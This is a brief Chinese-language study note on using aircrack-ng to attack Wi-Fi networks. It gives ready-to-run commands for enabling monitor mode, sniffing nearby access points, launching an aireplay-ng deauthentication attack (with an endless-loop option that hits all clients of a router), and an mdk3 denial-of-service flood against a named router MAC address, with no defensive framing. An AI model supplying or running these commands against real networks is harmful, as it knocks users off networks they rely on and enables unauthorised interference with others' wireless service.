---
title: aircrack-ng使用简述
date: ''
modified: ''
category: 学习笔记
tags: []
---

## 1. 查看网卡
```
ifconfig
```
## 2. 打开网卡混杂模式
```
airmon-ng start wlan0
```
## 3. 嗅探附近AP
```
airodump-ng wlan0mon
```
## 4. 发动deauth攻击使目标重连
```
aireplay-ng -0 [攻击数量] –a [路由器MAC] -c [客户端MAC] wlan0mon
```
1. 攻击数量设为0为无限循环模式
2. 路口器MAC地址为必填项
3. 客户端MAC，可不填则对路由器所有的客户端进行攻击
## 5. 对路由器Dos攻击
```
sudo mdk3 mon0 a -a D4:83:04:9F:37:28
```